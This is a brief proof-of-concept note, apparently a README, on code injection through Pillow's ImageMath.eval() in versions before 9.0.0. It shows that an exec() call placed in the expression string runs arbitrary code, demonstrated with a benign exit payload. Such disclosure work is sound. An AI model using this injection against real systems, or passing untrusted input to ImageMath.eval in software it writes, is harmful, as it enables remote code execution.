# Intro
`PIL.ImageMath.eval()` Evaluate expression in the given environment.
For example:
```math
a * 2
```
We can use this to take RCE so easy if the target uses `PIL.ImageMath.eval` in Pillow before 9.0.0

# PoC
Instead using `ImageMath.eval()` for math opreations, we may insert `exec()` like this 
```python
ImageMath.eval("exec(exit())")
```
it will execute what's inside right away
